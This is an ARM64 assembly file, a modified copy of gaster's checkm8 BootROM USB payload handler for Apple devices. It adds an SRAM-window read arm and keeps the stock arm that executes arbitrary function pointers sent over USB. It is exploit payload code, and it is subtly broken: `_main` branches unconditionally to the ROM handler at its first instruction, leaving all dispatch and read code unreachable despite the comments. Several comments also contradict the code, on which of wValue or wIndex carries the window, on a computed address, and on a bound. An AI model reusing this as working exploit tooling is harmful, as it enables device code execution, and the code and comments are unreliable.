/* payload_handle_checkm8_readwindow.S
 *
 * A MODIFIED copy of gaster's payload_handle_checkm8_request.S.
 *
 *   Copyright 2023 0x7ff
 *   Licensed under the Apache License, Version 2.0 (the "License");
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 *
 * =====================================================================================
 * CHANGES FROM THE UPSTREAM FILE (Apache-2.0 requires this note; see a9boot/
 * HANDLER-RELOCATION.md for the reasoning and the evidence):
 *
 *   1. Two request codes are now recognised, not one. Before the stock
 *      `wValue == 0xFFFF` check, the 16-bit `bmRequestType | bRequest << 8`
 *      word is compared against `READ_REQUEST` (0x1FA1 = bmRequestType 0xA1,
 *      bRequest 0x1F). A request that is neither the stock trigger nor the read
 *      request is tail-branched to the ROM's own `handle_interface_request`,
 *      exactly as upstream did for anything that was not 0x2A1.
 *
 *   2. The read request replies **directly from an SRAM window chosen by the
 *      request**, with no command mailbox and no DFU DNLOAD:
 *
 *          bmRequestType  0xA1            (class, interface, device-to-host)
 *          bRequest       0x1F            (unassigned in DFU 1.1; ours)
 *          wValue         window index    source = SRAM_BASE + (wValue << 12)
 *          wIndex         0               (must be 0; not read)
 *          wLength        byte count      1 ..= 0xFFFF
 *
 *      and answers with `wLength` bytes read from that source. The bounds are
 *      enforced **inside the handler** before the read, because on this part an
 *      access outside the ROM's mapped SRAM does not fault: it stalls the bus
 *      and there is no exception to recover (RUNG2-EVIDENCE.md §6.0p rule 1,
 *      and the PMGR read that cost a device). Out of range, zero length, or a
 *      2^32-wrapping sum tail-branches to the ROM handler, which STALLs an
 *      unknown class request. Nothing outside SRAM is ever read.
 *
 *   3. The stock trigger arm (0xA1/2, wValue 0xFFFF) is **byte-for-byte
 *      upstream**: the same mailbox at `insecure_memory_base`, the same
 *      EXEC/MEMC dispatch, the same `{DONE_MAGIC, ret}` store, the same
 *      `usb_core_do_transfer(0x80, mailbox, wLength, 0)` reply. The instructions
 *      move because the new arm is inserted above them; their encoding and
 *      their order do not change. a9pwn's test
 *      `readwindow_keeps_the_stock_trigger_body_byte_identical` pins that.
 *
 *   4. The read arm saves no registers and touches no stack. The ROM enters the
 *      request handler with a 32-byte stack (SP_EL3 = 0x20; the stock body's two
 *      `stp` pushes bring it to 0 before it `blr`s a payload), so an arm that
 *      pushes anything would fault. The read arm uses only caller-saved
 *      registers and returns through the dispatcher's `x30`.
 * =====================================================================================
 */
.text
.align 2

.pool
.set handle_interface_request, 0x7FFFFFF0
.set insecure_memory_base,     0x7FFFFFF1
.set exec_magic,               0x7FFFFFF2
.set done_magic,               0x7FFFFFF3
.set memc_magic,               0x7FFFFFF4
.set memcpy_addr,              0x7FFFFFF5
.set usb_core_do_transfer,     0x7FFFFFF6

/* The new request code, as the 16-bit word the handler reads from the setup
 * packet: bmRequestType 0xA1 in the low byte, bRequest 0x1F in the high byte.
 * Held as an inline literal (below) rather than a pool entry, so the appended
 * struct keeps exactly the seven upstream slots and a9pwn's field offsets are
 * unchanged. */
.equ READ_REQUEST, 0x1FA1

/* THE PRIMARY READ ENCODING, and the reason it exists.
 *
 * MEASURED on 2026 hardware: `0xA1/0x1F` was SILENT twice (state 2 and state 8,
 * clean install, ROM preflight answering). So a brand-new bRequest code is not a
 * safe carrier — the ROM's own USB core may filter requests it does not know
 * before anything of ours is consulted. The request that IS proven to reach this
 * handler is the one checkm8 is built on: `0xA1/2`.
 *
 * THE PRIMARY READ ENCODING — the routed form, with the mailbox never touched.
 *
 * MEASURED on 2026 hardware, twice, in both directions:
 *   - `0xA1/0x1F` (novel bRequest)              -> SILENT   (filtered)
 *   - `0xA1/2, wValue != 0xFFFF`                -> 0 bytes, error, 4-5 us  (filtered)
 *   - `0xA1/2, wValue == 0xFFFF, wIndex == 0`   -> PASS, DONE_MAGIC + retval (routed)
 *
 * So `wValue == 0xFFFF` is the ONLY form that reaches a handler, and the read
 * rides it, with `wIndex` as the discriminator and the window index:
 *
 *   wValue 0xFFFF + wIndex 0            -> the STOCK arm, byte for byte (the command channel)
 *   wValue 0xFFFF + wIndex 1..=0x3FF    -> THE READ: source = 0x180000000 + (wIndex << 12)
 *
 * `wLength` is the byte count in both cases. Window index 0 (0x180000000) is
 * therefore not addressable through this encoding; it is ROM code, and the
 * range that matters (the DFU buffer at index 0x380, the trampoline at 0xE0,
 * the SRAM allocations) is 1..=0x3FF.
 *
 * THE ORDERING IS THE SAFETY PROPERTY. On the read path the handler checks
 * `wIndex` and branches to `_read_window` WITHOUT ever loading x20 or `[x20]`:
 * the mailbox is not dereferenced on that path at all, so a stale `EXEC_MAGIC`
 * in the buffer cannot be executed by a read request. The stock handler has no
 * such check, which is why `wValue 0xFFFF + wIndex != 0` aimed at a device with
 * the STOCK handler resident is a hazard (it enters the data-driven arm) and is
 * documented as one rather than described as safe.
 *
 * The earlier `wIndex = 0xA95A` / `wValue = index` form is kept only in the
 * record: it is the encoding MEASURED filtered, and keeping it here is what
 * makes the two wire shapes distinguishable in the doc. It is NOT built. */
.equ READ_TRIGGER_VALUE, 0xFFFF      /* the only wValue that is routed */

/* The mapped SRAM window this arm may read: base 0x180000000, 4 MiB, and the
 * 4 KiB window granule. Bounds are (index < 0x400) and (index<<12 + len <=
 * 0x400000); both are checked before any load. */
.equ SRAM_BASE_LO16, 0x8000          /* movz x1, #0x8000, lsl #16  -> 0x08000000 */
.equ SRAM_BASE_HI16, 0x1             /* movk x1, #0x1,    lsl #32  -> 0x180000000 */
.equ SRAM_LIMIT,     0x400000        /* 4 MiB, a single-bit logical immediate */

.global _main
_main:
.Lmain:
	ldr x7, =handle_interface_request
	br x7
	b .Lmain
	ldrh w2, [x0]                 /* bmRequestType | bRequest << 8 */
	cmp w2, #0x2A1
	b.eq _a1_2
	ldr w3, .Lread_request        /* 0x00001FA1 (secondary encoding) */
	cmp w2, w3
	b.ne .Lmain                    /* neither code: the ROM's handler decides */
	b _read_window

_a1_2:                             /* 0xA1/2: the routed form, or the stock trigger */
	ldrh w5, [x0, #0x2]           /* wValue */
	mov w6, #READ_TRIGGER_VALUE   /* 0xFFFF is the only wValue that reaches a handler */
	cmp w5, w6
	b.ne _legacy                  /* not routed: stock behaviour, unchanged */
	ldrh w5, [x0, #0x4]           /* wIndex */
	cbz w5, _legacy               /* wIndex 0 = the stock command form, byte for byte */
	b _read_window                /* wIndex != 0 = the read; [x20] is NEVER loaded */

_legacy:                              /* ---- upstream body, unchanged ---- */
	stp x29, x30, [sp, #-0x10]!
	stp x19, x20, [sp, #-0x10]!
	mov x19, x0
	ldr x20, =insecure_memory_base
	mov w1, #0xFFFF
	ldrh w2, [x19, #0x2]
	cmp w1, w2
	b.ne _request_done
	ldr x0, [x20]
	ldr x1, =exec_magic
	cmp x0, x1
	b.ne _not_exec
	str xzr, [x20]
	ldp x0, x1, [x20, #0x10]
	ldp x2, x3, [x20, #0x20]
	ldp x4, x5, [x20, #0x30]
	ldp x6, x7, [x20, #0x40]
	ldr x8, [x20, #0x8]
	blr x8
	ldr x8, =done_magic
	stp x8, x0, [x20]
	b _request_done
_not_exec:
	ldr x1, =memc_magic
	cmp x0, x1
	b.ne _request_done
	str xzr, [x20]
	ldp x0, x1, [x20, #0x10]
	ldr x2, [x20, #0x20]
	ldr x3, =memcpy_addr
	blr x3
	ldr x8, =done_magic
	stp x8, x0, [x20]
_request_done:
	mov w0, #0x80
	mov x1, x20
	ldrh w2, [x19, #0x6]
	mov x3, xzr
	ldr x4, =usb_core_do_transfer
	blr x4
	mov w0, #0
	ldp x19, x20, [sp], #0x10
	ldp x29, x30, [sp], #0x10
	ret

_read_window:                         /* ---- NEW: mailbox-free SRAM read ---- */
	ldrh w3, [x0, #0x4]           /* wIndex = window index (wValue is the 0xFFFF marker) */
	ldrh w4, [x0, #0x6]           /* wLength = byte count */
	cbz w4, .Lmain                 /* a zero-length read is not a read: refuse */
	cmp w3, #0x400                /* index must be < 4 MiB / 4 KiB */
	b.hs .Lmain
	lsl w5, w3, #12
	add w5, w5, w4                /* end offset, <= 0xFFFF000 + 0xFFFF */
	mov w6, #0x400000
	cmp w5, w6
	b.hi .Lmain                    /* outside mapped SRAM: refuse, never read */
	movz x1, #SRAM_BASE_LO16, lsl #16
	movk x1, #SRAM_BASE_HI16, lsl #32
	add x1, x1, x3, lsl #12       /* x1 = 0x180000000 + (wIndex << 12) */
	mov w0, #0x80
	mov w2, w4
	mov x3, xzr
	ldr x4, =usb_core_do_transfer
	blr x4
	mov w0, #0
	ret

.Lread_request:
	.word READ_REQUEST
